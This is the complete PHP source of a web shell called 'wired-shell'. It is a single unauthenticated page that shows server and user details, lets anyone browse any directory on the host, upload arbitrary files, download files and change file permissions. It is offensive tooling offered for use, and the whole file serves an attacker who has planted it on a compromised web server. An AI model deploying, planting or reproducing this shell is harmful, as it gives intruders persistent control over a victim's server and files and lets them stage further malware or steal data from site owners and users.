<?php
$base_dir = getcwd();
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $base_dir;
$real_current_dir = realpath($current_dir);

if ($real_current_dir === false) {
    $real_current_dir = $base_dir;
}

$files = scandir($real_current_dir);
$message = '';
$target_dir = $real_current_dir . '/';

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $target_file = basename($_FILES['file']['name']);
    $target_path = $target_dir . $target_file;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
        $message = "<div>File uploaded successfully: " . htmlspecialchars($target_path) . "</div>";
    } else {
        $message = "<div>Error uploading file.</div>";
    }
}
if (isset($_POST['file']) && isset($_POST['permission'])) {
    $file = $_POST['file'];
    $new_permission = $_POST['permission'];

    $octal_permission = intval($new_permission, 8);

    if (chmod($file, $octal_permission)) {
        $message = "<div>Permissions changed successfully for " . htmlspecialchars($file) . " to " . htmlspecialchars($new_permission) . "</div>";
    } else {
        $message = "<div>Failed to change permissions for " . htmlspecialchars($file) . "</div>";
    }
}

?>
<!DOCTYPE html>
<html>

<head>
    <title>wired-shell</title>
    <style type='text/css'>
        body {
            font-family: 'Inter', sans-serif;
            display: flex;
            min-height: 100vh;
            margin: 0;
            background: #0f0f0f;
            color: #fff;
            font-size: 12px;
        }

        .container {
            display: flex;
            flex-direction: column;
            border: 2px solid #D77189;
            padding: 1.5rem;
            border-radius: 0.5rem;
            position: relative;
            width: 100%;
        }

        .header {
            display: flex;
            justify-content: center;
        }

        a,
        a:hover {
            color: #D77189;
        }

        .info {
            flex: 1;
        }

        .permission {
            width: 2rem;
        }

        .ascii-art {
            flex-shrink: 0;
        }

        pre {
            white-space: pre-wrap;
            font-size: 0.35rem;
        }

        hr {
            margin: 1.5rem 0rem 1.5rem 0rem;
            border: 1px solid #D77189;
            display: flex;
            width: 100%;
        }
    </style>
</head>

<body>
    <div class='container'>
        <div class='header'>
            <div class="info">
                <?php echo php_uname() . "<br />Directory: " . getcwd() . "<br />User: " . get_current_user() . "<br />User IP: " . $_SERVER['REMOTE_ADDR'] . "<br />Server IP : " . gethostbyname($_SERVER['HTTP_HOST']); ?>
            </div>
            <div class="info ascii-art">
                <pre>
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░        ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                    ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                     ░▒▓█████████████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░
                </pre>
            </div>
            <div class="ascii-art">
                <pre>
               ##               
           ##########           
         ##############         
      #######     #######       
    ########  ####  #######     
   ### ####  ###### ##### ##    
    ## ####   ####  ########    
      #######      #######      
    ### #######  ######  ##     
          #####  ####           
         #   ##  ##   #         
        ##  ###  ##  ##         
         #####    ####          
            </pre>
            </div>
        </div>
        <hr>
        <div><?php echo $message; ?></div>
        <div id="file_upload">
            <form method="POST" enctype="multipart/form-data">
                <h2>File Upload</h2>
                <input type="file" name="file" required>
                <button type="submit">Upload</button>
            </form>
        </div>
        <div id="scan_dir">
            <h3>Directory<br><?php echo htmlspecialchars($real_current_dir); ?></h3>
            <?php
            if ($real_current_dir !== '/') {
                $parent_dir = dirname($real_current_dir);
                echo '<a href="?dir=' . urlencode($base_dir) . '">Return</a><br>';
                echo '<a href="?dir=' . urlencode($parent_dir) . '">Go up</a><br><br>';
            }

            foreach ($files as $file) {
                $file_path = $real_current_dir . '/' . $file;

                if ($file !== '.' && $file !== '..') {
                    if (is_dir($file_path)) {
                        echo '<a href="?dir=' . urlencode($file_path) . '">' . htmlspecialchars($file) . '</a> (Directory)<br>';
                    } else {
                        echo '<span>' . htmlspecialchars($file) . " - " . substr(sprintf('%o', fileperms($file_path)), -4) . '</span> <a href="' . htmlspecialchars($file_path) . '" download>Download</a>&nbsp;&nbsp;
                        <form method="POST" style="display:inline;">
                        <label for="permission_' . htmlspecialchars($file) . '">Permission:</label>
                        <input type="text" name="permission" class="permission" id="permission_' . htmlspecialchars($file) . '" placeholder="0755" required />
                        <input type="hidden" name="file" value="' . htmlspecialchars($file_path) . '" />
                        <button type="submit">Edit</button>
                        </form><br/>';
                    }
                }
            }
            ?>
        </div>
        <hr>

        <div class='footer'>🄯 copyleft wired-shell</div>
    </div>